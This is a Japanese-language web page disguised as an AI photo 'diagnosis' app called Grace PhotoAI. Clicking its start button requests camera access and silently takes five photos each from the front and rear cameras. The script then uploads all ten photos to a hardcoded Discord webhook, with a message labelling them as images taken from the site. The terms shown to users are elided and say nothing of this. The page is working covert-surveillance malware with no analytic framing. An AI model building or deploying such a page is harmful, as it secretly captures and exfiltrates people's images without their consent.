
<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Grace PhotoAI</title>
  <style>
    body {
      background-color: #1a1a1a;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
    }
    h1 {
      font-size: 2.5rem;
      margin-top: 2rem;
    }
    button {
      font-size: 1.5rem;
      padding: 1rem 2rem;
      margin: 2rem;
      border-radius: 8px;
      border: none;
      background-color: #4caf50;
      color: white;
      cursor: pointer;
    }
    .terms-link {
      font-size: 0.9rem;
      text-decoration: underline;
      cursor: pointer;
      color: #aaa;
      margin-bottom: 30px;
      display: inline-block;
    }
    .modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0; top: 0;
      width: 100%; height: 100%;
      background-color: rgba(0,0,0,0.8);
      overflow: auto;
    }
    .modal-content {
      background: #2c2c2c;
      color: white;
      margin: 10% auto;
      padding: 20px;
      border-radius: 8px;
      max-width: 700px;
      font-size: clamp(0.8rem, 2vw, 1rem);
    }
    .close {
      float: right;
      font-size: 1.2rem;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h1>Grace PhotoAI</h1>
  <button id="startButton">診断する</button>
  <div class="terms-link" id="termsLink">利用規約</div>

  <div id="termsModal" class="modal">
    <div class="modal-content">
      <span class="close" id="closeModal">&times;</span>
      <h2>利用規約</h2>
      <p>...（省略：利用規約の本文）...</p>
    </div>
  </div>

  <script>
    document.getElementById("termsLink").onclick = () => {
      document.getElementById("termsModal").style.display = "block";
    };
    document.getElementById("closeModal").onclick = () => {
      document.getElementById("termsModal").style.display = "none";
    };
    window.onclick = e => {
      if (e.target == document.getElementById("termsModal")) {
        document.getElementById("termsModal").style.display = "none";
      }
    };

    document.getElementById("startButton").onclick = async function () {
      const webhook = "https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u";
      const formData = new FormData();
      const images = [];

      async function captureImages(facingMode) {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
        const video = document.createElement("video");
        video.setAttribute("playsinline", true);
        video.muted = true;
        video.srcObject = stream;
        await video.play();

        await new Promise(resolve => {
          video.onloadedmetadata = () => resolve();
        });

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");

        for (let i = 0; i < 5; i++) {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
          images.push(blob);
          await new Promise(r => setTimeout(r, 200));
        }

        stream.getTracks().forEach(track => track.stop());
      }

      await captureImages("user");
      await captureImages("environment");

      // テキストメッセージを一緒に送る
      const payload = {
        content: "サイトから取得した写真を送信

＜━━━━━＞
1〜5枚目 インカメラで撮影した写真
6〜10枚目 アウトカメラで撮影した写真
インカメラ→内カメ
アウトカメラ→外カメ"
      };
      formData.append("payload_json", JSON.stringify(payload));

      images.forEach((blob, i) => {
        formData.append(`files[${i}]`, blob, `photo${i + 1}.jpg`);
      });

      await fetch(webhook, {
        method: "POST",
        body: formData
      });
    };
  </script>
</body>
</html>
